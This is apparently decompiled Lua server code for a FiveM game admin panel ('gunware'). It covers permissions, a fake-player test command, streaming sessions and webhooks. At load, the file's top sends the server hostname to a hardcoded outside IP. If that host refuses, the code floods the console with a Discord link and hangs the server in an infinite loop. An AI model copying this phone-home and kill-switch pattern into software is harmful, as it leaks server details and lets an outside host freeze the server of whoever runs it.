local L0_1, L1_1, L2_1, L3_1, L4_1, L5_1, L6_1, L7_1, L8_1, L9_1, L10_1, L11_1, L12_1, L13_1, L14_1, L15_1, L16_1, L17_1, L18_1, L19_1, L20_1, L21_1, L22_1, L23_1, L24_1, L25_1, L26_1, L27_1, L28_1, L29_1, L30_1, L31_1, L32_1, L33_1, L34_1, L35_1, L36_1, L37_1, L38_1, L39_1, L40_1, L41_1, L42_1, L43_1, L44_1, L45_1, L46_1, L47_1, L48_1, L49_1, L50_1, L51_1, L52_1, L53_1, L54_1, L55_1, L56_1, L57_1, L58_1, L59_1, L60_1, L61_1, L62_1, L63_1, L64_1, L65_1, L66_1, L67_1, L68_1, L69_1, L70_1, L71_1, L72_1, L73_1, L74_1, L75_1, L76_1, L77_1, L78_1, L79_1, L80_1, L81_1, L82_1, L83_1, L84_1, L85_1, L86_1
L0_1 = PerformHttpRequest
L1_1 = "http://72.61.109.230:3000/check"
function L2_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  if 200 ~= A0_2 then
    return
  end
  L2_2 = pcall
  function L3_2()
    local L0_3, L1_3
    L0_3 = json
    L0_3 = L0_3.decode
    L1_3 = A1_2
    if not L1_3 then
      L1_3 = "{}"
    end
    return L0_3(L1_3)
  end
  L2_2, L3_2 = L2_2(L3_2)
  if not L2_2 then
    return
  end
  L4_2 = L3_2.allowed
  if not L4_2 then
    L4_2 = 1
    L5_2 = 100
    L6_2 = 1
    for L7_2 = L4_2, L5_2, L6_2 do
      L8_2 = print
      L9_2 = "^3IP NOT ALLOWED https://discord.gg/geT9FxUbPY"
      L8_2(L9_2)
    end
    L4_2 = Wait
    L5_2 = 4000
    L4_2(L5_2)
    while true do
    end
    return
  end
end
L3_1 = "POST"
L4_1 = json
L4_1 = L4_1.encode
L5_1 = {}
L6_1 = GetCurrentResourceName
L6_1 = L6_1()
L5_1.resource = L6_1
L6_1 = GetConvar
L7_1 = "sv_hostname"
L8_1 = "unknown"
L6_1 = L6_1(L7_1, L8_1)
L5_1.hostname = L6_1
L4_1 = L4_1(L5_1)
L5_1 = {}
L5_1["Content-Type"] = "application/json"
L5_1.Accept = "application/json"
L0_1(L1_1, L2_1, L3_1, L4_1, L5_1)
L0_1 = {}
serverButtonFunds = L0_1
L0_1 = {}
PlayerServer = L0_1
L0_1 = {}
PlayerServerOffline = L0_1
L0_1 = {}
custom_data = L0_1
L0_1 = {}
reportServer = L0_1
L0_1 = {}
ranksServer = L0_1
L0_1 = {}
Handling = L0_1
L0_1 = 0
L1_1 = false
L2_1 = initializingPlayers
if not L2_1 then
  L2_1 = {}
end
initializingPlayers = L2_1
L2_1 = {}
L3_1 = 15
L4_1 = {}
L5_1 = {}
L6_1 = {}
function L7_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = print
  L2_2 = "[gw-admin][stream] %s"
  L3_2 = L2_2
  L2_2 = L2_2.format
  L4_2 = A0_2
  L2_2, L3_2, L4_2 = L2_2(L3_2, L4_2)
  L1_2(L2_2, L3_2, L4_2)
end
function L8_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = "%d:%d:%d"
  L3_2 = L2_2
  L2_2 = L2_2.format
  L4_2 = A0_2
  L5_2 = A1_2
  L6_2 = os
  L6_2 = L6_2.time
  L6_2 = L6_2()
  return L2_2(L3_2, L4_2, L5_2, L6_2)
end
function L9_1(A0_2)
  local L1_2
  if not A0_2 or "" == A0_2 then
    L1_2 = nil
    return L1_2
  end
  L1_2 = L4_1
  L1_2 = L1_2[A0_2]
  return L1_2
end
function L10_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L3_2 = L4_1
  L3_2 = L3_2[A0_2]
  if not L3_2 then
    L4_2 = false
    return L4_2
  end
  L4_2 = L4_1
  L4_2[A0_2] = nil
  L4_2 = {}
  L4_2.sessionId = A0_2
  L4_2.role = "viewer"
  L5_2 = A1_2 or L5_2
  if not A1_2 then
    L5_2 = "ended"
  end
  L4_2.reason = L5_2
  L5_2 = {}
  L5_2.sessionId = A0_2
  L5_2.role = "broadcaster"
  L6_2 = A1_2 or L6_2
  if not A1_2 then
    L6_2 = "ended"
  end
  L5_2.reason = L6_2
  if "viewer" ~= A2_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:stream:stopClient"
    L8_2 = L3_2.adminSrc
    L9_2 = L4_2
    L6_2(L7_2, L8_2, L9_2)
  end
  if "broadcaster" ~= A2_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:stream:stopClient"
    L8_2 = L3_2.targetSrc
    L9_2 = L5_2
    L6_2(L7_2, L8_2, L9_2)
  end
  L6_2 = L7_1
  L7_2 = "session %s stopped (reason=%s)"
  L8_2 = L7_2
  L7_2 = L7_2.format
  L9_2 = A0_2
  L10_2 = tostring
  L11_2 = A1_2
  L10_2, L11_2 = L10_2(L11_2)
  L7_2, L8_2, L9_2, L10_2, L11_2 = L7_2(L8_2, L9_2, L10_2, L11_2)
  L6_2(L7_2, L8_2, L9_2, L10_2, L11_2)
  L6_2 = true
  return L6_2
end
function L11_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L2_2 = {}
  L3_2 = pairs
  L4_2 = L4_1
  L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
  for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
    L9_2 = L8_2.adminSrc
    if L9_2 ~= A0_2 then
      L9_2 = L8_2.targetSrc
      if L9_2 ~= A0_2 then
        goto lbl_28
      end
    end
    L9_2 = #L2_2
    L9_2 = L9_2 + 1
    L10_2 = {}
    L10_2.id = L7_2
    L11_2 = L8_2.adminSrc
    if L11_2 == A0_2 then
      L11_2 = "viewer"
      if L11_2 then
        goto lbl_26
      end
    end
    L11_2 = "broadcaster"
    ::lbl_26::
    L10_2.role = L11_2
    L2_2[L9_2] = L10_2
    ::lbl_28::
  end
  L3_2 = ipairs
  L4_2 = L2_2
  L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
  for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
    L9_2 = L10_1
    L10_2 = L8_2.id
    L11_2 = A1_2 or L11_2
    if not A1_2 then
      L11_2 = "player_left"
    end
    L12_2 = L8_2.role
    L9_2(L10_2, L11_2, L12_2)
  end
end
function L12_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L4_2 = L5_1
  L4_2 = L4_2[A0_2]
  if not L4_2 then
    L5_2 = false
    return L5_2
  end
  L5_2 = L5_1
  L5_2[A0_2] = nil
  L5_2 = L6_1
  L5_2 = L5_2[L4_2]
  if L5_2 == A0_2 then
    L5_2 = L6_1
    L5_2[L4_2] = nil
  end
  L5_2 = {}
  L5_2.adminSrc = A0_2
  L5_2.target = L4_2
  L6_2 = A1_2 or L6_2
  if not A1_2 then
    L6_2 = "stopped"
  end
  L5_2.reason = L6_2
  if not A3_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:takecontrol:release"
    L8_2 = L4_2
    L9_2 = L5_2
    L6_2(L7_2, L8_2, L9_2)
  end
  if not A2_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:takecontrol:stop"
    L8_2 = A0_2
    L9_2 = L5_2
    L6_2(L7_2, L8_2, L9_2)
  end
  L6_2 = true
  return L6_2
end
function L13_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L2_2 = L5_1
  L2_2 = L2_2[A0_2]
  if L2_2 then
    L2_2 = L12_1
    L3_2 = A0_2
    L4_2 = A1_2 or L4_2
    if not A1_2 then
      L4_2 = "player_left"
    end
    L5_2 = true
    L6_2 = false
    L2_2(L3_2, L4_2, L5_2, L6_2)
  end
  L2_2 = L6_1
  L2_2 = L2_2[A0_2]
  if L2_2 then
    L3_2 = L12_1
    L4_2 = L2_2
    L5_2 = A1_2 or L5_2
    if not A1_2 then
      L5_2 = "player_left"
    end
    L6_2 = false
    L7_2 = true
    L3_2(L4_2, L5_2, L6_2, L7_2)
  end
end
L14_1 = SERVER_DEBUG_MODE
if not L14_1 then
  L14_1 = true
end
SERVER_DEBUG_MODE = L14_1
L14_1 = SYNC_LOG_PREFIX
if not L14_1 then
  L14_1 = "[SYNC-SERVER]"
end
SYNC_LOG_PREFIX = L14_1
function L14_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L2_2 = SERVER_DEBUG_MODE
  if L2_2 then
    L2_2 = os
    L2_2 = L2_2.date
    L3_2 = "[%H:%M:%S]"
    L2_2 = L2_2(L3_2)
    L3_2 = string
    L3_2 = L3_2.format
    L4_2 = "%s %s %s"
    L5_2 = L2_2
    L6_2 = SYNC_LOG_PREFIX
    L7_2 = A0_2
    L3_2 = L3_2(L4_2, L5_2, L6_2, L7_2)
    if "error" == A1_2 then
    elseif "warning" == A1_2 then
    else
      if "success" == A1_2 then
      else
      end
    end
  end
end
serverSyncLog = L14_1
L14_1 = {}
L15_1 = {}
L15_1.first = "Alex"
L15_1.last = "Dupont"
L16_1 = {}
L16_1.first = "Emma"
L16_1.last = "Bernard"
L17_1 = {}
L17_1.first = "Noah"
L17_1.last = "Leroy"
L18_1 = {}
L18_1.first = "L\195\169a"
L18_1.last = "Moreau"
L19_1 = {}
L19_1.first = "Louis"
L19_1.last = "Fournier"
L20_1 = {}
L20_1.first = "Chlo\195\169"
L20_1.last = "Girard"
L21_1 = {}
L21_1.first = "Gabriel"
L21_1.last = "Fontaine"
L22_1 = {}
L22_1.first = "Jade"
L22_1.last = "Marchand"
L23_1 = {}
L23_1.first = "Hugo"
L23_1.last = "Robin"
L24_1 = {}
L24_1.first = "In\195\168s"
L24_1.last = "Renard"
L14_1[1] = L15_1
L14_1[2] = L16_1
L14_1[3] = L17_1
L14_1[4] = L18_1
L14_1[5] = L19_1
L14_1[6] = L20_1
L14_1[7] = L21_1
L14_1[8] = L22_1
L14_1[9] = L23_1
L14_1[10] = L24_1
function L15_1()
  local L0_2, L1_2
end
function L16_1(A0_2)
  local L1_2
end
function L17_1(A0_2, A1_2)
end
function L18_1(A0_2)
  local L1_2
end
function L19_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = A0_2 - 1
  L2_2 = L14_1
  L2_2 = #L2_2
  L1_2 = L1_2 % L2_2
  L2_2 = L1_2 + 1
  L1_2 = L14_1
  L1_2 = L1_2[L2_2]
  L2_2 = {}
  L3_2 = L1_2.first
  L2_2.first = L3_2
  L3_2 = L1_2.last
  L2_2.last = L3_2
  L3_2 = string
  L3_2 = L3_2.format
  L4_2 = "fallback-%d"
  L5_2 = A0_2
  L3_2 = L3_2(L4_2, L5_2)
  L2_2.seed = L3_2
  return L2_2
end
function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L2_2 = {}
  L3_2 = 1
  L4_2 = A0_2
  L5_2 = 1
  for L6_2 = L3_2, L4_2, L5_2 do
    L7_2 = #L2_2
    L7_2 = L7_2 + 1
    L8_2 = L19_1
    L9_2 = L6_2
    L8_2 = L8_2(L9_2)
    L2_2[L7_2] = L8_2
  end
  L3_2 = A1_2
  L4_2 = L2_2
  L3_2(L4_2)
end
function L21_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2
  if 0 == A0_2 then
    L3_2 = print
    L4_2 = "[FAKEPLAYER] %s"
    L5_2 = L4_2
    L4_2 = L4_2.format
    L6_2 = A1_2
    L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2, L6_2)
    L3_2(L4_2, L5_2, L6_2, L7_2)
  else
    L3_2 = TriggerClientEvent
    L4_2 = "gunware:notif"
    L5_2 = A0_2
    L6_2 = A2_2 or L6_2
    if not A2_2 then
      L6_2 = "info"
    end
    L7_2 = A1_2
    L3_2(L4_2, L5_2, L6_2, L7_2)
  end
end
function L22_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L3_2 = 0
  L4_2 = 1
  L5_2 = A1_2
  L6_2 = 1
  for L7_2 = L4_2, L5_2, L6_2 do
    L8_2 = A2_2[L7_2]
    if not L8_2 then
      L8_2 = L19_1
      L9_2 = L7_2
      L8_2 = L8_2(L9_2)
    end
    L9_2 = L16_1
    L10_2 = L8_2
    L9_2, L10_2 = L9_2(L10_2)
    L11_2 = PlayerServer
    L11_2[L9_2] = L10_2
    L11_2 = L2_1
    L11_2[L9_2] = L10_2
    L11_2 = L17_1
    L12_2 = L9_2
    L13_2 = L10_2
    L11_2(L12_2, L13_2)
    L3_2 = L3_2 + 1
  end
  L4_2 = L21_1
  L5_2 = A0_2
  L6_2 = "Ajout de %d faux joueurs pour les tests."
  L7_2 = L6_2
  L6_2 = L6_2.format
  L8_2 = L3_2
  L6_2 = L6_2(L7_2, L8_2)
  L7_2 = "success"
  L4_2(L5_2, L6_2, L7_2)
  L4_2 = serverSyncLog
  L5_2 = string
  L5_2 = L5_2.format
  L6_2 = "Fake players added: %d (requested %d)"
  L7_2 = L3_2
  L8_2 = A1_2
  L5_2 = L5_2(L6_2, L7_2, L8_2)
  L6_2 = "info"
  L4_2(L5_2, L6_2)
end
L23_1 = {}
L24_1 = require
L25_1 = "shared.permissions"
L24_1 = L24_1(L25_1)
L25_1 = {}
L25_1["\195\160"] = "a"
L25_1["\195\161"] = "a"
L25_1["\195\162"] = "a"
L25_1["\195\164"] = "a"
L25_1["\195\163"] = "a"
L25_1["\195\165"] = "a"
L25_1["\195\167"] = "c"
L25_1["\195\168"] = "e"
L25_1["\195\169"] = "e"
L25_1.ê = "e"
L25_1["\195\171"] = "e"
L25_1["\195\172"] = "i"
L25_1["\195\173"] = "i"
L25_1["\195\174"] = "i"
L25_1["\195\175"] = "i"
L25_1["\195\177"] = "n"
L25_1["\195\178"] = "o"
L25_1["\195\179"] = "o"
L25_1["\195\180"] = "o"
L25_1["\195\182"] = "o"
L25_1.õ = "o"
L25_1["\195\185"] = "u"
L25_1.ú = "u"
L25_1["\195\187"] = "u"
L25_1["\195\188"] = "u"
L25_1["\195\189"] = "y"
L25_1["\195\191"] = "y"
L25_1["\195\128"] = "a"
L25_1["\195\129"] = "a"
L25_1["\195\130"] = "a"
L25_1["\195\132"] = "a"
L25_1["\195\131"] = "a"
L25_1["\195\133"] = "a"
L25_1["\195\135"] = "c"
L25_1["\195\136"] = "e"
L25_1["\195\137"] = "e"
L25_1["\195\138"] = "e"
L25_1["\195\139"] = "e"
L25_1["\195\140"] = "i"
L25_1["\195\141"] = "i"
L25_1["\195\142"] = "i"
L25_1["\195\143"] = "i"
L25_1["\195\145"] = "n"
L25_1["\195\146"] = "o"
L25_1["\195\147"] = "o"
L25_1["\195\148"] = "o"
L25_1["\195\150"] = "o"
L25_1["\195\149"] = "o"
L25_1["\195\153"] = "u"
L25_1["\195\154"] = "u"
L25_1["\195\155"] = "u"
L25_1["\195\156"] = "u"
L25_1["\195\157"] = "y"
L25_1["\197\146"] = "oe"
L25_1["\197\147"] = "oe"
L25_1["\195\134"] = "ae"
L25_1["\195\166"] = "ae"
function L26_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = type
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if "string" ~= L1_2 or "" == A0_2 then
    L1_2 = ""
    return L1_2
  end
  L2_2 = A0_2
  L1_2 = A0_2.gsub
  L3_2 = "[%z\001-\127\194-\244][\128-\191]*"
  function L4_2(A0_3)
    local L1_3
    L1_3 = L25_1
    L1_3 = L1_3[A0_3]
    if not L1_3 then
      L1_3 = A0_3
    end
    return L1_3
  end
  L1_2 = L1_2(L2_2, L3_2, L4_2)
  L3_2 = L1_2
  L2_2 = L1_2.lower
  L2_2 = L2_2(L3_2)
  L3_2 = L2_2
  L2_2 = L2_2.gsub
  L4_2 = "[^%w]"
  L5_2 = ""
  L2_2 = L2_2(L3_2, L4_2, L5_2)
  L1_2 = L2_2
  return L1_2
end
function L27_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = type
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if "string" ~= L1_2 or "" == A0_2 then
    L1_2 = ""
    return L1_2
  end
  L2_2 = A0_2
  L1_2 = A0_2.match
  L3_2 = "^[%w_/]+$"
  L1_2 = L1_2(L2_2, L3_2)
  if L1_2 then
    L2_2 = A0_2
    L1_2 = A0_2.lower
    return L1_2(L2_2)
  end
  L1_2 = ""
  return L1_2
end
function L28_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L1_2 = type
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if "table" ~= L1_2 then
    L1_2 = {}
    return L1_2
  end
  L1_2 = {}
  L2_2 = pairs
  L3_2 = A0_2
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = L27_1
    L9_2 = L6_2
    L8_2 = L8_2(L9_2)
    if "" ~= L8_2 then
      L9_2 = true == L7_2
      L1_2[L8_2] = L9_2
    end
  end
  return L1_2
end
L29_1 = _G
L29_1.normalizeLabel = L26_1
L29_1 = _G
L29_1.normalizePermissionsTable = L28_1
function L29_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2
  if not A1_2 or "" == A1_2 then
    L2_2 = false
    return L2_2
  end
  L2_2 = IsMaster
  if L2_2 then
    L2_2 = IsMaster
    L3_2 = A0_2
    L2_2 = L2_2(L3_2)
    if L2_2 then
      L2_2 = true
      return L2_2
    end
  end
  L2_2 = PlayerServer
  L2_2 = L2_2[A0_2]
  if L2_2 then
    L3_2 = L2_2.permission
    if L3_2 then
      goto lbl_26
    end
  end
  L3_2 = false
  do return L3_2 end
  ::lbl_26::
  L3_2 = L2_2.permission
  if "all" == L3_2 then
    L3_2 = true
    return L3_2
  end
  L3_2 = L2_2.permission
  L3_2 = L3_2[A1_2]
  if true == L3_2 then
    L3_2 = true
    return L3_2
  end
  L3_2 = type
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if "string" == L3_2 then
    L4_2 = A1_2
    L3_2 = A1_2.lower
    L3_2 = L3_2(L4_2)
    if L3_2 ~= A1_2 then
      L4_2 = L2_2.permission
      L4_2 = L4_2[L3_2]
      if true == L4_2 then
        L4_2 = true
        return L4_2
      end
    end
  end
  L3_2 = false
  return L3_2
end
L30_1 = RegisterCommand
L31_1 = "fakeplayer"
function L32_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L2_2 = A0_2
  if 0 ~= L2_2 then
    L3_2 = L29_1
    L4_2 = L2_2
    L5_2 = "gestion_server"
    L3_2 = L3_2(L4_2, L5_2)
    if not L3_2 then
      L3_2 = IsMaster
      L4_2 = L2_2
      L3_2 = L3_2(L4_2)
      if not L3_2 then
        L3_2 = L21_1
        L4_2 = L2_2
        L5_2 = "Vous n'avez pas la permission pour cette commande."
        L6_2 = "error"
        L3_2(L4_2, L5_2, L6_2)
        return
      end
    end
  end
  L3_2 = A1_2[1]
  if L3_2 then
    L3_2 = A1_2[1]
    L4_2 = L3_2
    L3_2 = L3_2.lower
    L3_2 = L3_2(L4_2)
    if L3_2 then
      goto lbl_30
    end
  end
  L3_2 = "help"
  ::lbl_30::
  if "add" ~= L3_2 and "spawn" ~= L3_2 then
    L4_2 = tonumber
    L5_2 = L3_2
    L4_2 = L4_2(L5_2)
    if not L4_2 then
      goto lbl_66
    end
  end
  L4_2 = tonumber
  L5_2 = L3_2
  L4_2 = L4_2(L5_2)
  if not L4_2 then
    L4_2 = tonumber
    L5_2 = A1_2[2]
    L4_2 = L4_2(L5_2)
    if not L4_2 then
      L4_2 = 1
    end
  end
  L5_2 = math
  L5_2 = L5_2.min
  L6_2 = math
  L6_2 = L6_2.max
  L7_2 = L4_2
  L8_2 = 1
  L6_2 = L6_2(L7_2, L8_2)
  L7_2 = 1000000000
  L5_2 = L5_2(L6_2, L7_2)
  L4_2 = L5_2
  L5_2 = L20_1
  L6_2 = L4_2
  function L7_2(A0_3)
    local L1_3, L2_3, L3_3, L4_3
    L1_3 = #A0_3
    if 0 == L1_3 then
      L1_3 = serverSyncLog
      L2_3 = "Random user API unavailable, using fallback names"
      L3_3 = "warning"
      L1_3(L2_3, L3_3)
    end
    L1_3 = L22_1
    L2_3 = L2_2
    L3_3 = L4_2
    L4_3 = A0_3
    L1_3(L2_3, L3_3, L4_3)
  end
  L5_2(L6_2, L7_2)
  goto lbl_109
  ::lbl_66::
  if "clear" == L3_2 or "reset" == L3_2 then
    L4_2 = 0
    L5_2 = pairs
    L6_2 = L2_1
    L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2)
    for L9_2 in L5_2, L6_2, L7_2, L8_2 do
      L10_2 = PlayerServer
      L10_2[L9_2] = nil
      L10_2 = L18_1
      L11_2 = L9_2
      L10_2(L11_2)
      L10_2 = L2_1
      L10_2[L9_2] = nil
      L4_2 = L4_2 + 1
    end
    L5_2 = L21_1
    L6_2 = L2_2
    L7_2 = "Suppression de %d faux joueurs."
    L8_2 = L7_2
    L7_2 = L7_2.format
    L9_2 = L4_2
    L7_2 = L7_2(L8_2, L9_2)
    L8_2 = "success"
    L5_2(L6_2, L7_2, L8_2)
    L5_2 = serverSyncLog
    L6_2 = string
    L6_2 = L6_2.format
    L7_2 = "Fake players cleared: %d"
    L8_2 = L4_2
    L6_2 = L6_2(L7_2, L8_2)
    L7_2 = "info"
    L5_2(L6_2, L7_2)
  else
    L4_2 = L21_1
    L5_2 = L2_2
    L6_2 = "Usage: /fakeplayer <nombre> | /fakeplayer add <nombre> | /fakeplayer clear"
    L7_2 = "info"
    L4_2(L5_2, L6_2, L7_2)
  end
  ::lbl_109::
end
L33_1 = false
L30_1(L31_1, L32_1, L33_1)
function L30_1()
  local L0_2, L1_2
  L0_2 = L3_1
  L0_2 = L0_2 + 1
  L3_1 = L0_2
  L0_2 = L3_1
  return L0_2
end
L31_1 = config
if not L31_1 then
  L31_1 = {}
end
L32_1 = ESX
if not L32_1 then
  L32_1 = nil
end
L33_1 = QBCore
if not L33_1 then
  L33_1 = nil
end
L34_1 = MySQL
if not L34_1 then
  L34_1 = nil
end
L35_1 = webhookList
if not L35_1 then
  L35_1 = {}
end
L36_1 = "default"
L37_1 = 200
L38_1 = 5000
L39_1 = 3
L40_1 = {}
L41_1 = false
L42_1 = {}
L42_1.sent = 0
L42_1.failed = 0
L42_1.retried = 0
L43_1 = 1.0
function L44_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L1_2 = A0_2
  if nil == L1_2 or "" == L1_2 then
    L1_2 = L36_1
  end
  L2_2 = L35_1
  L2_2 = L2_2[L1_2]
  if not L2_2 or "" == L2_2 then
    L4_2 = L36_1
    L3_2 = L35_1
    L2_2 = L3_2[L4_2]
    if not L2_2 then
      L3_2 = print
      L4_2 = "[LOG] Aucun webhook valide trouv\195\169 pour '%s' (aucun d\195\169faut configur\195\169)"
      L5_2 = L4_2
      L4_2 = L4_2.format
      L6_2 = tostring
      L7_2 = A0_2
      L6_2, L7_2 = L6_2(L7_2)
      L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2, L6_2, L7_2)
      L3_2(L4_2, L5_2, L6_2, L7_2)
      L3_2 = nil
      return L3_2
    end
    L3_2 = L36_1
    if L1_2 ~= L3_2 then
      L3_2 = print
      L4_2 = "[LOG] Webhook '%s' introuvable, utilisation du webhook par d\195\169faut."
      L5_2 = L4_2
      L4_2 = L4_2.format
      L6_2 = tostring
      L7_2 = A0_2
      L6_2, L7_2 = L6_2(L7_2)
      L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2, L6_2, L7_2)
      L3_2(L4_2, L5_2, L6_2, L7_2)
    end
    L1_2 = L36_1
  end
  L3_2 = L2_2
  L4_2 = L1_2
  return L3_2, L4_2
end
function L45_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = GetPlayerIdentifiers
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if L1_2 then
    L2_2 = ipairs
    L3_2 = L1_2
    L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
    for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
      L8_2 = string
      L8_2 = L8_2.match
      L9_2 = L7_2
      L10_2 = "^license:"
      L8_2 = L8_2(L9_2, L10_2)
      if L8_2 then
        return L7_2
      else
        L8_2 = string
        L8_2 = L8_2.match
        L9_2 = L7_2
        L10_2 = "^steam:"
        L8_2 = L8_2(L9_2, L10_2)
        if L8_2 then
          return L7_2
        end
      end
    end
  end
  L2_2 = nil
  return L2_2
end
getIdentifiant = L45_1
function L45_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = GetPlayerPed
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  L2_2 = DoesEntityExist
  L3_2 = L1_2
  L2_2 = L2_2(L3_2)
  if L2_2 then
    L2_2 = GetEntityCoords
    L3_2 = L1_2
    L2_2 = L2_2(L3_2)
    L3_2 = {}
    L4_2 = L2_2.x
    L3_2.x = L4_2
    L4_2 = L2_2.y
    L3_2.y = L4_2
    L4_2 = L2_2.z
    L3_2.z = L4_2
    return L3_2
  end
  L2_2 = nil
  return L2_2
end
getCoords = L45_1
function L45_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L2_2 = pairs
  L3_2 = A0_2
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    if L7_2 == A1_2 then
      L8_2 = true
      return L8_2
    end
  end
  L2_2 = false
  return L2_2
end
IsInTable = L45_1
function L45_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2
  if not A0_2 or "" == A0_2 then
    return
  end
  L2_2 = {}
  L3_2 = false
  L4_2 = pairs
  L5_2 = PlayerServer
  L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
  for L8_2, L9_2 in L4_2, L5_2, L6_2, L7_2 do
    if L8_2 ~= A1_2 and L9_2 then
      L10_2 = L9_2.identifier
      if L10_2 == A0_2 then
        L10_2 = PlayerServer
        L10_2[L8_2] = nil
        L10_2 = #L2_2
        L10_2 = L10_2 + 1
        L2_2[L10_2] = L8_2
        L10_2 = L9_2.role
        if L10_2 then
          L10_2 = L9_2.role
          if "user" ~= L10_2 then
            L3_2 = true
          end
        end
        L10_2 = serverSyncLog
        if L10_2 then
          L10_2 = serverSyncLog
          L11_2 = string
          L11_2 = L11_2.format
          L12_2 = "Entr\195\169e PlayerServer obsol\195\168te purg\195\169e pour l'ID serveur %d (identifier %s)"
          L13_2 = L8_2
          L14_2 = A0_2
          L11_2 = L11_2(L12_2, L13_2, L14_2)
          L12_2 = "warning"
          L10_2(L11_2, L12_2)
        end
      end
    end
  end
  L4_2 = #L2_2
  if 0 == L4_2 then
    return
  end
  if L3_2 then
    L4_2 = InvalidateStaffCache
    if L4_2 then
      L4_2 = InvalidateStaffCache
      L4_2()
    end
  end
  L4_2 = GetOnlineStaff
  L4_2 = L4_2()
  if L4_2 then
    L5_2 = #L4_2
    if L5_2 > 0 then
      L5_2 = ipairs
      L6_2 = L4_2
      L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2)
      for L9_2, L10_2 in L5_2, L6_2, L7_2, L8_2 do
        L11_2 = ipairs
        L12_2 = L2_2
        L11_2, L12_2, L13_2, L14_2 = L11_2(L12_2)
        for L15_2, L16_2 in L11_2, L12_2, L13_2, L14_2 do
          L17_2 = TriggerClientEvent
          L18_2 = "gunware:player:leave"
          L19_2 = L10_2
          L20_2 = L16_2
          L17_2(L18_2, L19_2, L20_2)
        end
      end
    end
  end
end
function L46_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L1_2 = L30_1
  L1_2 = L1_2()
  L2_2 = string
  L2_2 = L2_2.format
  L3_2 = "fake:%s:%d"
  L4_2 = A0_2.seed
  if not L4_2 then
    L4_2 = os
    L4_2 = L4_2.time
    L4_2 = L4_2()
  end
  L5_2 = L1_2
  L2_2 = L2_2(L3_2, L4_2, L5_2)
  L3_2 = "user"
  L4_2 = {}
  L4_2.source = L1_2
  L4_2.identifier = L2_2
  L5_2 = string
  L5_2 = L5_2.format
  L6_2 = "%s %s"
  L7_2 = A0_2.first
  L8_2 = A0_2.last
  L5_2 = L5_2(L6_2, L7_2, L8_2)
  L4_2.name = L5_2
  L5_2 = string
  L5_2 = L5_2.format
  L6_2 = "%s %s"
  L7_2 = A0_2.first
  L8_2 = A0_2.last
  L5_2 = L5_2(L6_2, L7_2, L8_2)
  L4_2.rp = L5_2
  L4_2.role = L3_2
  L5_2 = getRoleColor
  L6_2 = L3_2
  L5_2 = L5_2(L6_2)
  L4_2.roleColor = L5_2
  L5_2 = getGamerTagColor
  L6_2 = L3_2
  L5_2 = L5_2(L6_2)
  L4_2.gamerTagColor = L5_2
  L5_2 = math
  L5_2 = L5_2.random
  L6_2 = 20
  L7_2 = 120
  L5_2 = L5_2(L6_2, L7_2)
